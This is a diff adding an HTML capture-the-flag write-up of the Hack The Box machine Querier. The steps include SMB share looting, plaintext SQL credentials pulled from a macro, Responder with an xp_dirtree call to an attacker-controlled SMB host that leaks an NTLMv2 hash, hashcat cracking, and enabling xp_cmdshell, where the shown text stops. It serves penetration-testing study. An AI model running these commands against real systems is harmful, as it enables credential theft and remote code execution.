@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Querier</strong></h1>
+        <em>Released: 16th Feb 2019 / Pwned: June 18th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        I thought Querier was quite a realistic machine, which makes a nice change in comparison to quite a few of the other machines on hackthebox. However, I found myself being handed the solution by scripts in a lot of the steps on this box, which isn't so great. Perhaps this would be a good challenge to revisit and solve manually, without the help of such scripts.<br>
+        <br>
+        <strong>Summary</strong><br>
+        • Retrieve file from netbios-ssn and extract contnets<br>
+        • Find credentials in .bin using strings<br>
+        • Capture NTLMv2 hash using ms-sql's xp_dirtree command<br>
+        • Use alamot's mssql_shell.py to get a user shell on the system<br>
+        • PowerUp<br>
+        • Get root shell using impacket's psexec.py<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.125</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/querier#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.125<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                135/tcp&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                139/tcp&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
+                445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds?<br>
+                1433/tcp&nbsp;open&nbsp;&nbsp;ms-sql-s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;&nbsp;14.00.1000.00<br>
+                |&nbsp;ms-sql-ntlm-info:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Target_Name:&nbsp;HTB<br>
+                |&nbsp;&nbsp;&nbsp;NetBIOS_Domain_Name:&nbsp;HTB<br>
+                |&nbsp;&nbsp;&nbsp;NetBIOS_Computer_Name:&nbsp;QUERIER<br>
+                |&nbsp;&nbsp;&nbsp;DNS_Domain_Name:&nbsp;HTB.LOCAL<br>
+                |&nbsp;&nbsp;&nbsp;DNS_Computer_Name:&nbsp;QUERIER.HTB.LOCAL<br>
+                |&nbsp;&nbsp;&nbsp;DNS_Tree_Name:&nbsp;HTB.LOCAL<br>
+                |_&nbsp;&nbsp;Product_Version:&nbsp;10.0.17763<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=SSL_Self_Signed_Fallback<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2019-05-24T09:00:09<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2049-05-24T09:00:09<br>
+                |_ssl-date:&nbsp;2019-05-24T09:12:17+00:00;&nbsp;0s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        There's only a handful of relevant ports on this box. 139 is our first port of call.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 139/smb</strong></h2><br>
+        Log in via a NULL session (no password) and retrieve what you can.<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier/139netbios#&nbsp;smbclient&nbsp;-L&nbsp;10.10.10.125<br>
+                Enter&nbsp;WORKGROUP\root's&nbsp;password:&nbsp;<br>
+                <br>
+                Sharename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;Admin<br>
+                C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Default&nbsp;share<br>
+                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;IPC<br>
+                Reports&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Reconnecting&nbsp;with&nbsp;SMB1&nbsp;for&nbsp;workgroup&nbsp;listing.<br>
+                do_connect:&nbsp;Connection&nbsp;to&nbsp;10.10.10.125&nbsp;failed&nbsp;(Error&nbsp;NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>
+                Failed&nbsp;to&nbsp;connect&nbsp;with&nbsp;SMB1&nbsp;--&nbsp;no&nbsp;workgroup&nbsp;available<br>
+                root@gotham:~/ctf/querier#&nbsp;smbclient&nbsp;//10.10.10.125/Reports<br>
+                Enter&nbsp;WORKGROUP\root's&nbsp;password:&nbsp;<br>
+                Try&nbsp;"help"&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
+                smb:&nbsp;\&gt;&nbsp;ls<br>
+                &nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Mon&nbsp;Jan&nbsp;28&nbsp;23:23:48&nbsp;2019<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Mon&nbsp;Jan&nbsp;28&nbsp;23:23:48&nbsp;2019<br>
+                &nbsp;&nbsp;Currency&nbsp;Volume&nbsp;Report.xlsm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;12229&nbsp;&nbsp;Sun&nbsp;Jan&nbsp;27&nbsp;22:21:34&nbsp;2019<br>
+                <br>
+                6469119&nbsp;blocks&nbsp;of&nbsp;size&nbsp;4096.&nbsp;1610485&nbsp;blocks&nbsp;available<br>
+                smb:&nbsp;\&gt;&nbsp;get&nbsp;"Currency&nbsp;Volume&nbsp;Report.xlsm"<br>
+                getting&nbsp;file&nbsp;\Currency&nbsp;Volume&nbsp;Report.xlsm&nbsp;of&nbsp;size&nbsp;12229&nbsp;as&nbsp;Currency&nbsp;Volume&nbsp;Report.xlsm&nbsp;(66.3&nbsp;KiloBytes/sec)&nbsp;(average&nbsp;66.3&nbsp;KiloBytes/sec)<br>
+                smb:&nbsp;\&gt;&nbsp;exit
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Currency Volume Report.xlsm</strong></h2><br>
+        This is a Microsoft Excel file that you can unzip to get at its contents.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier/139netbios#&nbsp;unzip&nbsp;Currency\&nbsp;Volume\&nbsp;Report.xlsm&nbsp;<br>
+                Archive:&nbsp;&nbsp;Currency&nbsp;Volume&nbsp;Report.xlsm<br>
+                &nbsp;&nbsp;inflating:&nbsp;[Content_Types].xml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;_rels/.rels&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;xl/workbook.xml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;xl/_rels/workbook.xml.rels&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;xl/worksheets/sheet1.xml&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;xl/theme/theme1.xml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;xl/styles.xml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;xl/vbaProject.bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;docProps/core.xml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;inflating:&nbsp;docProps/app.xml
+            </div>
+        </div><br>
+        <br>
+        By reading the strings of vbaProject.bin, you'll find a set of SQL credentials that are being used in a query.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier/139netbios/xl#&nbsp;strings&nbsp;vbaProject.bin<br>
+                macro&nbsp;to&nbsp;pull&nbsp;data&nbsp;for&nbsp;client&nbsp;volume&nbsp;reports<br>
+                ...<br>
+                &nbsp;MsgBox&nbsp;"connection&nbsp;successful"<br>
+                Set&nbsp;rs&nbsp;=&nbsp;conn.Execute("SELECT&nbsp;*&nbsp;@@version;")<br>
+                Driver={SQL&nbsp;Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6<br>
+                &nbsp;further&nbsp;testing&nbsp;required<br>
+            </div>
+        </div><br>
+        <br>
+        Uid = <code>reporting</code><br>
+        Pwd = <code>PcwTWTHRwryjc$c6</code><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) 1433/ms-sql</strong></h2><br>
+        Logging in using those credentials isn't quite as simple as you hope it would be. ms-sql can accept multiple types of authentication, and to log in using <em>reporting</em>'s credentials requires Windows authentication. I'm not sure if there's any hint at this apart from trial and error. Thankfully, impacket has a nice python script to help us log in.<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier/1433ms-sql#&nbsp;wget&nbsp;https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py<br>
+                ...<br>
+                root@gotham:~/ctf/querier/1433ms-sql#&nbsp;python&nbsp;mssqlclient.py&nbsp;reporting@10.10.10.125&nbsp;-windows-auth<br>
+                Impacket&nbsp;v0.9.19&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                Password:&nbsp;PcwTWTHRwryjc$c6<br>
+                <br>
+            </div>
+        </div><br>
+        <br>
+        But after looking around, there ends up being nothing of use in the database :/<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) xp_dirtree</strong></h2><br>
+        Instead, we can capture user's NTLMv2 hashes using ms-sql's <code>xp_dirtree</code> and querying an smb server that we control. When the database queries our smb server, we should retrieve some user's and their hashes.<br>
+        <br>
+        Start responder.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier/1433ms-sql#&nbsp;responder&nbsp;-I&nbsp;tun0<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__<br>
+                &nbsp;&nbsp;.----.-----.-----.-----.-----.-----.--|&nbsp;&nbsp;|.-----.----.<br>
+                &nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;_|&nbsp;&nbsp;-__|__&nbsp;--|&nbsp;&nbsp;_&nbsp;&nbsp;|&nbsp;&nbsp;_&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;_&nbsp;&nbsp;||&nbsp;&nbsp;-__|&nbsp;&nbsp;&nbsp;_|<br>
+                &nbsp;&nbsp;|__|&nbsp;|_____|_____|&nbsp;&nbsp;&nbsp;__|_____|__|__|_____||_____|__|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|__|<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NBT-NS,&nbsp;LLMNR&nbsp;&amp;&nbsp;MDNS&nbsp;Responder&nbsp;2.3.3.9<br>
+                <br>
+                &nbsp;&nbsp;Author:&nbsp;Laurent&nbsp;Gaffie&nbsp;(laurent.gaffie@gmail.com)<br>
+                &nbsp;&nbsp;To&nbsp;kill&nbsp;this&nbsp;script&nbsp;hit&nbsp;CRTL-C<br>
+                <br>
+                <br>
+                [+]&nbsp;Poisoners:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;LLMNR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;NBT-NS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DNS/MDNS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                <br>
+                [+]&nbsp;Servers:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;HTTP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;HTTPS&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;WPAD&nbsp;proxy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Auth&nbsp;proxy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;SMB&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Kerberos&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;SQL&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;FTP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;IMAP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;POP3&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;SMTP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DNS&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;LDAP&nbsp;server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ON]<br>
+                <br>
+                [+]&nbsp;HTTP&nbsp;Options:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Always&nbsp;serving&nbsp;EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Serving&nbsp;EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Serving&nbsp;HTML&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Upstream&nbsp;Proxy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                <br>
+                [+]&nbsp;Poisoning&nbsp;Options:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Analyze&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Force&nbsp;WPAD&nbsp;auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Force&nbsp;Basic&nbsp;Auth&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Force&nbsp;LM&nbsp;downgrade&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Fingerprint&nbsp;hosts&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[OFF]<br>
+                <br>
+                [+]&nbsp;Generic&nbsp;Options:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Responder&nbsp;NIC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[tun0]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Responder&nbsp;IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[10.10.14.181]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Challenge&nbsp;set&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[random]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Don't&nbsp;Respond&nbsp;To&nbsp;Names&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;['ISATAP']<br>
+                <br>
+                <br>
+                <br>
+                [+]&nbsp;Listening&nbsp;for&nbsp;events...<br>
+            </div>
+        </div><br>
+        <br>
+        Attempt to list the contnets of our/responder's smb share using <code>xp_dirtree</code><br>
+            <div class="codebox">
+                SQL&gt;&nbsp;EXEC&nbsp;master.sys.xp_dirtree&nbsp;'\\10.10.14.181\heyshare'
+            </div>
+        </div><br>
+        <br>
+        And responder should capture the NTLMv2 hashes of the users querying our share.<br>
+            <div class="codebox">
+                [SMBv2]&nbsp;NTLMv2-SSP&nbsp;Client&nbsp;&nbsp;&nbsp;:&nbsp;10.10.10.125<br>
+                [SMBv2]&nbsp;NTLMv2-SSP&nbsp;Username&nbsp;:&nbsp;QUERIER\mssql-svc<br>
+                [SMBv2]&nbsp;NTLMv2-SSP&nbsp;Hash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;mssql-svc::QUERIER:235bd30dfa4bca77:476BF9589B3A6A7F85F04DA7CFAB2C6D:0101000000000000C0653150DE09D2012F34B6622DAC70FB000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000575576516CFE81637CD97364480B3C08BA4B1F7D732745A4484490208694978A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310038003100000000000000000000000000<br>
+                [*]&nbsp;Skipping&nbsp;previously&nbsp;captured&nbsp;hash&nbsp;for&nbsp;QUERIER\mssql-svc<br>
+                [+]&nbsp;Exiting...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) hashcat - crack NTLMv2 hashes</strong></h2><br>
+        We can crack our newly retrieved hash with hashcat.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier#&nbsp;echo&nbsp;"mssql-svc::QUERIER:235bd30dfa4bca77:476BF9589B3A6A7F85F04DA7CFAB2C6D:0101000000000000C0653150DE09D2012F34B6622DAC70FB000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000575576516CFE81637CD97364480B3C08BA4B1F7D732745A4484490208694978A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310038003100000000000000000000000000"&nbsp;&gt;&nbsp;ntlmv2-hashes.txt&nbsp;<br>
+                root@gotham:~/ctf/querier#&nbsp;hashcat&nbsp;-m&nbsp;5600&nbsp;ntlmv2-hashes.txt&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;-o&nbsp;ntlmv2-cracked.txt&nbsp;--force
+            </div>
+        </div><br>
+        <br>
+        Our new-found credentials are:<br>
+        <code>mssql-svc</code><br>
+        <code>corporate568</code><br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) xp_cmdshell</strong></h2><br>
+        ms-sql databases have a stored procedure called xp_cmdshell, which is exactly what it sounds like. With it you'll have remote code execution on the server because you can execute system commands via the database.<br>
+        <br>
+        Whilst enumerating the ms-sql database earlier, enabling and running the xp_cmdshell procedure wasn't possible because the ‘reporting’ user didn't have the permissions to enable it. However, the mssql-svc user <em>does</em> have the permissions to do this (as you can see below by getting an output of <em>whoami</em>) and we can get a shell on the system.<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/querier/1433ms-sql#&nbsp;python&nbsp;mssqlclient.py&nbsp;-windows-auth&nbsp;mssql-svc@10.10.10.125<br>
+                Impacket&nbsp;v0.9.19&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                Password:&nbsp;corporate568<br>
+                [*]&nbsp;Encryption&nbsp;required,&nbsp;switching&nbsp;to&nbsp;TLS<br>
+                [*]&nbsp;ENVCHANGE(DATABASE):&nbsp;Old&nbsp;Value:&nbsp;master,&nbsp;New&nbsp;Value:&nbsp;master<br>
+                [*]&nbsp;ENVCHANGE(LANGUAGE):&nbsp;Old&nbsp;Value:&nbsp;None,&nbsp;New&nbsp;Value:&nbsp;us_english<br>
+                [*]&nbsp;ENVCHANGE(PACKETSIZE):&nbsp;Old&nbsp;Value:&nbsp;4096,&nbsp;New&nbsp;Value:&nbsp;16192<br>
+                [*]&nbsp;INFO(QUERIER):&nbsp;Line&nbsp;1:&nbsp;Changed&nbsp;database&nbsp;context&nbsp;to&nbsp;'master'.<br>
+                [*]&nbsp;INFO(QUERIER):&nbsp;Line&nbsp;1:&nbsp;Changed&nbsp;language&nbsp;setting&nbsp;to&nbsp;us_english.<br>
+                [*]&nbsp;ACK:&nbsp;Result:&nbsp;1&nbsp;-&nbsp;Microsoft&nbsp;SQL&nbsp;Server&nbsp;(140&nbsp;3232)&nbsp;<br>
+                [!]&nbsp;Press&nbsp;help&nbsp;for&nbsp;extra&nbsp;shell&nbsp;commands<br>
+                SQL&gt;&nbsp;EXEC&nbsp;master.sys.xp_cmdshell&nbsp;whoami<br>
+                [-]&nbsp;ERROR(QUERIER):&nbsp;Line&nbsp;1:&nbsp;SQL&nbsp;Server&nbsp;blocked&nbsp;access&nbsp;to&nbsp;procedure&nbsp;'sys.xp_cmdshell'&nbsp;of&nbsp;component&nbsp;'xp_cmdshell'&nbsp;because&nbsp;this&nbsp;component&nbsp;is&nbsp;turned&nbsp;off&nbsp;...<br>
+                SQL&gt;&nbsp;EXEC&nbsp;sp_configure&nbsp;'show&nbsp;advanced&nbsp;options',&nbsp;1<br>
+                [*]&nbsp;INFO(QUERIER):&nbsp;Line&nbsp;185:&nbsp;Configuration&nbsp;option&nbsp;'show&nbsp;advanced&nbsp;options'&nbsp;changed&nbsp;from&nbsp;0&nbsp;to&nbsp;1.&nbsp;Run&nbsp;the&nbsp;RECONFIGURE&nbsp;statement&nbsp;to&nbsp;install.<br>
+                SQL&gt;&nbsp;RECONFIGURE<br>
+                SQL&gt;&nbsp;EXEC&nbsp;sp_configure&nbsp;'xp_cmdshell',&nbsp;1<br>
